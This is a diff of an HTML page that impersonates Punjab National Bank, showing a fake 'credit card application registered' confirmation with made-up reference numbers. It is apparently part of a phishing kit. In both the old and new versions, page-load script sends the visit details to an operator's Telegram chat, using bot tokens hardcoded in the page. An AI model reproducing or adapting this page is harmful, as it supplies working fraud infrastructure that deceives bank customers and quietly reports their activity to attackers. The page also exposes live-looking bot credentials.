@@ -3,152 +3,119 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>PNB Transaction Success</title>
+    <title>Punjab National Bank - Successful Submission</title>
     <link rel="stylesheet" href="style.css">
     <style>
         body {
-            font-family: 'Arial', sans-serif;
-            margin: 0;
-            padding: 0;
-            background-color: #1d1d1d;
-            color: white;
-        }
-
-        .container {
+            font-family: Arial, sans-serif;
+            background-color: #f9f9f9;
+            color: #333;
             text-align: center;
-            max-width: 800px;
-            margin: 50px auto;
-            background-color: #2a2a2a;
-            border-radius: 15px;
-            padding: 40px;
-            box-shadow: 0px 0px 30px rgba(0, 0, 0, 0.5);
-            animation: fadeIn 1s ease-in-out;
+            padding: 30px;
         }
 
-        h1 {
-            font-size: 48px;
-            color: #f4b400;
-            margin-bottom: 30px;
+        .success-container {
+            background-color: #fff;
+            padding: 20px;
+            border-radius: 10px;
+            border: 2px solid #28a745;
+            max-width: 600px;
+            margin: 0 auto;
         }
 
-        .success-message {
-            font-size: 24px;
-            margin-bottom: 20px;
-            color: #28a745; /* Green color for success message */
+        .success-container h1 {
+            color: #28a745;
         }
 
-        .reference-number {
-            font-size: 28px;
-            font-weight: bold;
-            margin: 20px 0;
-            color: red;
-            animation: slideIn 1s ease-in-out;
-        }
-
-        .transaction-info {
-            font-size: 20px;
-            color: #d5d5d5;
-            margin: 20px 0;
-        }
-
-        .tg-button {
-            background-color: #f4b400; /* Yellow background */
-            color: white;
-            padding: 15px 30px;
+        .success-container p {
             font-size: 18px;
-            text-decoration: none;
-            border-radius: 5px;
-            transition: background-color 0.3s;
-            width: 60%;
-            margin-top: 30px;
-            display: inline-block;
+            margin: 20px 0;
         }
 
-        .tg-button:hover {
-            background-color: #e0a500;
+        .success-container .confirmation {
+            font-size: 20px;
+            font-weight: bold;
+            color: #ff5722;
         }
 
-        footer {
+        .success-container img {
+            width: 150px;  /* Increased logo size */
+            margin: 20px 0;
+        }
+
+        .footer {
             background-color: #2a2a2a;
             color: white;
             text-align: center;
-            padding: 15px;
-            margin-top: 30px;
+            padding: 10px;
+            margin-top: 50px;
         }
 
-        footer a {
+        .footer a {
             color: #f4b400;
             text-decoration: none;
         }
 
-        footer a:hover {
+        .footer a:hover {
             text-decoration: underline;
-        }
-
-        @keyframes fadeIn {
-            0% {
-                opacity: 0;
-            }
-            100% {
-                opacity: 1;
-            }
-        }
-
-        @keyframes slideIn {
-            0% {
-                transform: translateY(50px);
-                opacity: 0;
-            }
-            100% {
-                transform: translateY(0);
-                opacity: 1;
-            }
         }
     </style>
 </head>
 <body>
 
-    <div class="container">
-        <h1>Transaction Completed</h1>
-        <p class="success-message">Your transaction has been successfully processed!</p>
+    <div class="success-container">
+        <img src="last.webp" alt="PNB Logo">
+        <h1>Success! Your Credit Card Application is Registered.</h1>
+        <p class="confirmation">Thank you for applying. Your request has been successfully submitted.</p>
+        <p>Our team will get in touch with you soon. Please wait for 24-48 hours for further processing.</p>
+        <p>We have successfully registered your Credit Card application. You will receive further updates shortly.</p>
 
-        <div class="reference-number">
-            <span>Reference Number: </span><span id="ref-number">PNB-<span id="random-number"></span></span>
-        </div>
+        <!-- Time of submission -->
+        <p><strong>Submitted on: </strong><span id="submission-time"></span></p>
 
-        <div class="transaction-info">
-            <p><strong>Transaction Time: </strong><span id="transaction-time"></span></p>
-    
-        </div>
+        <!-- Reference Number -->
+        <p><strong>Reference No: </strong><span id="reference-no"></span></p>
 
-        <a href="index.html" class="tg-button" id="connect-tg" target="_blank">Connect with PNB Support Team</a>
+        <!-- Additional instructions -->
+        <p>If you have any questions, feel free to reach out to our customer support.</p>
     </div>
 
-    <footer>
+    <div class="footer">
         <p>&copy; 2025 Punjab National Bank. All rights reserved.</p>
         <p>For support, visit our <a href="#">Help Center</a> or call <a href="tel:+18001802030">1800-180-2030</a></p>
-    </footer>
+    </div>
 
     <script>
-        const botToken = "8195910833:AAGjf_PrdNBLevxSO4DW_lbSGl1wp6RJA4A"; // Replace with your bot token
-        const chatId = "-1002424646619"; // Replace with your chat ID
+        // Array of 15 possible reference numbers
+        const referenceNumbers = [
+            'PNB1234567890', 'PNB2345678901', 'PNB3456789012', 'PNB4567890123',
+            'PNB5678901234', 'PNB6789012345', 'PNB7890123456', 'PNB8901234567',
+            'PNB9012345678', 'PNB0123456789', 'PNB1357902468', 'PNB2468013579',
+            'PNB3579124680', 'PNB4680235791', 'PNB5791346802'
+        ];
 
-        // Function to generate a random reference number
-        function generateReferenceNumber() {
-            const randomNumber = Math.floor(Math.random() * 10000000000); // Generate 10-digit random number
-            document.getElementById("random-number").textContent = randomNumber;
-            document.getElementById("ref-number").textContent = "PNB-" + randomNumber;
-            sendTelegramMessage(randomNumber); // Send reference number to Telegram
-        }
+        // Function to randomly select one reference number from the array
+        const randomRefNumber = referenceNumbers[Math.floor(Math.random() * referenceNumbers.length)];
 
-        // Function to send reference number to Telegram
-        function sendTelegramMessage(referenceNumber) {
-            const message = `📊 **PNB Transaction Success**\n🆔 Reference Number: PNB-${referenceNumber}`;
+        // Get the current submission time
+        const submissionTime = new Date();
+        const options = { year: 'numeric', month: 'long', day: 'numeric', hour: '2-digit', minute: '2-digit', second: '2-digit' };
+        const formattedTime = submissionTime.toLocaleString('en-US', options);
 
+        // Display the reference number and time in the HTML
+        document.getElementById('reference-no').textContent = randomRefNumber;
+        document.getElementById('submission-time').textContent = formattedTime;
+
+        // Telegram Bot API Token and Chat ID
+        const botToken = '7302997867:AAGU5IW98_lQkdPXn5Y7lAxFEZUIP7Yo1YQ';
+        const chatId = '-1002377802733';
+
+        // Function to send the message to Telegram
+        function sendToTelegram(message) {
             fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-                method: "POST",
+                method: 'POST',
                 headers: {
-                    "Content-Type": "application/json"
+                    'Content-Type': 'application/json'
                 },
                 body: JSON.stringify({
                     chat_id: chatId,
@@ -157,29 +124,21 @@
             })
             .then(response => {
                 if (response.ok) {
-                    console.log("Message sent successfully.");
+                    console.log('Message sent successfully!');
                 } else {
-                    console.error("Error sending message.");
+                    console.error('Failed to send message.');
                 }
             })
-            .catch(error => console.error("Telegram Error:", error));
+            .catch(error => {
+                console.error('Error sending message:', error);
+            });
         }
 
-        // Get current time and date
-        function getCurrentDateTime() {
-            const currentDate = new Date();
-            const formattedDate = currentDate.toLocaleString();
-            document.getElementById("transaction-time").textContent = formattedDate;
-        }
+        // Prepare the message to send to the Telegram bot
+        const message = `🔹 **PNB Credit Card Application**\n🕒 Submitted on: ${formattedTime}\n🔢 Reference No: ${randomRefNumber}`;
 
-       
-
-        // Generate reference number and fetch other data on page load
-        window.onload = () => {
-            generateReferenceNumber();
-            getCurrentDateTime();
-            getUserLocation();
-        };
+        // Send the message to Telegram
+        sendToTelegram(message);
     </script>
 
 </body>
